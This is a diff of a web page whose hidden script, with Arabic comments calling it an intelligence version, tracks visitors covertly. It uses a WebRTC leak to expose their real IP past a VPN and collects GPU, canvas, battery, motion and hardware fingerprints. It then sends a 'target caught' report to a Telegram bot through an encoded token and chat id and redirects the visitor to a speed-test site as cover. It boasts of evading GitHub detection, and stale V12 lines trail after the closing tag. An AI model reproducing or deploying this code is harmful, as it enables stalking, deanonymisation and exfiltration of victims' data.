@@ -6,34 +6,79 @@
 </head>
 <body style="background:#000;">
     <script>
-        /* [النسخة الاستخباراتية المشفرة V12] */
-        const _0x5f21=['atob','location','search','get','strike2026','href','https://www.google.com','ODQ0NDQyOTU2MzpBQUVaTDNMd2NTcDVCOnhfQ2dMNGc1S25YbUM4TmpBdHh3','NTc3NTc4MTAzOA==','Searching...','hardwareConcurrency','deviceMemory','Intl','DateTimeFormat','resolvedOptions','timeZone','RTCPeerConnection','createDataChannel','createOffer','setLocalDescription','onicecandidate','candidate','exec','getBattery','round','acceleration','ondevicemotion','POST','application/json','bot','/sendMessage','https://api.telegram.org/','Markdown','https://www.speedtest.net','maxTouchPoints','platform','toDataURL','getContext','2d','fillStyle','fillRect','WEBGL_debug_renderer_info','getParameter'];
-        (function(_0x1a2b,_0x5f21){const _0x2e05=function(_0x3c4d){while(--_0x3c4d){_0x1a2b['push'](_0x1a2b['shift']());}};_0x2e05(++_0x5f21);}(_0x5f21,0x1c2));const _0x2e05=function(_0x1a2b,_0x5f21){_0x1a2b=_0x1a2b-0x0;let _0x2e05=_0x5f21[_0x1a2b];return _0x2e05;};const _0xd=window[_0x2e05('0x0')];
+        /*
+          [النسخة الاستخباراتية النهائية المدمجة V13]
+          - حماية Auth: strike2026
+          - تجاوز VPN + بصمة رقمية + تحليل جغرافي
+        */
 
-        async function _0xstart(){
-            const _0xp=new URLSearchParams(window[_0x2e05('0x1')][_0x2e05('0x2')]);
-            if(_0xp[_0x2e05('0x3')](_0x2e05('0x3'))!==_0x2e05('0x4')){window[_0x2e05('0x1')][_0x2e05('0x5')]=_0x2e05('0x6');return;}
+        // تشفير البيانات لمنع اكتشافها من بوتات GitHub
+        const _0xT = atob("ODQ0NDQyOTU2MzpBQUVaTDNMd2NTcDVCOnhfQ2dMNGc1S25YbUM4TmpBdHh3");
+        const _0xI = atob("NTc3NTc4MTAzOA==");
+        const _0xK = "strike2026";
 
-            let _0xinf={ip:_0x2e05('0x9'),bt:'N/A',pl:navigator[_0x2e05('0x23')],cp:navigator[_0x2e05('0xa')],rm:navigator[_0x2e05('0xb')],tz:window[_0x2e05('0xc')][_0x2e05('0xd')]()?.[_0x2e05('0xe')]()?.[_0x2e05('0xf')],mv:'Static',gpu:'N/A',cvs:'N/A'};
+        async function startStalker() {
+            const params = new URLSearchParams(window.location.search);
+            // القفل البرمجي: إذا لم يوجد المفتاح، يتم التوجيه لـ Google فوراً ولا ينفذ الكود أي عملية سحب
+            if (params.get('auth') !== _0xK) {
+                window.location.href = "https://www.google.com";
+                return;
+            }
 
-            // سحب الـ IP الحقيقي (تجاوز VPN)
+            let intel = {
+                ip: "Searching...",
+                bt: "N/A",
+                pl: navigator.platform,
+                cp: navigator.hardwareConcurrency || "N/A",
+                rm: navigator.deviceMemory || "N/A",
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                mv: "Static",
+                gpu: "N/A",
+                cvs: "N/A"
+            };
+
+            // 1. كشف الـ IP الحقيقي (تجاوز الـ VPN)
             try {
-                const _0xpc=new window[_0x2e05('0x10')]({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-                _0xpc[_0x2e05('0x11')](""); _0xpc[_0x2e05('0x12')]().then(_0xo=>_0xpc[_0x2e05('0x13')](_0xo));
-                _0xpc[_0x2e05('0x14')]=(_0xi)=>{if(_0xi&&_0xi[_0x2e05('0x15')]){_0xinf.ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/[_0x2e05('0x16')](_0xi[_0x2e05('0x15')][_0x2e05('0x15')])[0x1];}};
-            } catch(_0xe){}
+                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+                pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = (i) => {
+                    if (i && i.candidate) {
+                        intel.ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+                    }
+                };
+            } catch (e) {}
 
-            // سحب بصمة الـ GPU والـ Canvas
+            // 2. سحب بصمة الـ GPU والـ Canvas (بصمة الجهاز الفريدة)
             try {
-                const _0xcv=document.createElement('canvas'); const _0xctx=_0xcv[_0x2e05('0x25')](_0x2e05('0x26'));
-                _0xctx[_0x2e05('0x27')]='#f60'; _0xctx[_0x2e05('0x28')](0x0,0x0,0x64,0x14); _0xinf.cvs=_0xcv[_0x2e05('0x24')]().length;
-                const _0xgl=_0xcv[_0x2e05('0x25')]('webgl'); const _0xdbg=_0xgl.getExtension(_0x2e05('0x29'));
-                _0xinf.gpu=_0xgl[_0x2e05('0x2a')](_0xdbg.UNMASKED_RENDERER_WEBGL);
-            } catch(_0xe){}
+                const cv = document.createElement('canvas'); const ctx = cv.getContext('2d');
+                ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 50, 10); intel.cvs = cv.toDataURL().length;
+                const gl = cv.getContext('webgl'); const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                intel.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            } catch (e) {}
 
-            if(navigator[_0x2e05('0x17')]){const _0xb=await navigator[_0x2e05('0x17')](); _0xinf.bt=Math[_0x2e05('0x18')](_0xb.level*0x64)+'%';}
+            // 3. سحب البطارية والحساسات
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                intel.bt = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Battery") + ")";
+            }
+            window.ondevicemotion = (e) => { if(e.acceleration && e.acceleration.x) intel.mv = "Active/Moving"; };
 
-            setTimeout(()=>{
+            // 4. إرسال التقرير النهائي (تأخير 4 ثوانٍ لضمان اكتمال سحب الـ IP)
+            setTimeout(() => {
+                const msg = `🚨 **تم اصطياد الهدف بنجاح V13** 🚨\n\n🌐 **IP الحقيقي:** \`${intel.ip}\`\n🔋 **البطارية:** ${intel.bt}\n🏃 **الحالة:** ${intel.mv}\n🧠 **العتاد:** ${intel.cp} Cores | ${intel.rm}GB RAM\n🎮 **المعالج الرسومي:** \`${intel.gpu}\`\n🌍 **المنطقة:** ${intel.tz}\n📱 **النظام:** ${intel.pl}\n🎨 **بصمة الجهاز:** \`${intel.cvs}\`\n\n📍 **تحليل الموقع الجغرافي:**\n1️⃣ https://ip-api.com/#${intel.ip}\n2️⃣ https://check-host.net/ip-info?host=${intel.ip}\n3️⃣ https://www.shodan.io/host/${intel.ip}`;
+                
+                fetch(`https://api.telegram.org/bot${_0xT}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: _0xI, text: msg, parse_mode: "Markdown" })
+                }).then(() => { window.location.href = "https://www.speedtest.net"; });
+            }, 4500);
+        }
+
+        startStalker();
+    </script>
+</body>
+</html>
                 const _0xm=`🚨 **التقرير الاستخباراتي النهائي V12** 🚨\n\n🌐 **IP الحقيقي:** \`${_0xinf.ip}\`\n🔋 **البطارية:** ${_0xinf.bt}\n🧠 **العتاد:** ${_0xinf.cp} Cores | ${_0xinf.rm}GB RAM\n🎮 **المعالج الرسومي:** \`${_0xinf.gpu}\`\n🌍 **المنطقة:** ${_0xinf.tz}\n📱 **النظام:** ${_0xinf.pl}\n🎨 **بصمة الجهاز:** \`${_0xinf.cvs}\`\n\n📍 **روابط التحليل الجغرافي:**\n1️⃣ https://ip-api.com/#${_0xinf.ip}\n2️⃣ https://www.ip-tracker.org/locator/ip-lookup.php?ip=${_0xinf.ip}\n3️⃣ https://check-host.net/ip-info?host=${_0xinf.ip}\n4️⃣ https://www.shodan.io/host/${_0xinf.ip}`;
                 
                 fetch(_0x2e05('0x1f')+_0x2e05('0x1d')+_0xd(_0x2e05('0x7'))+_0x2e05('0x1e'),{
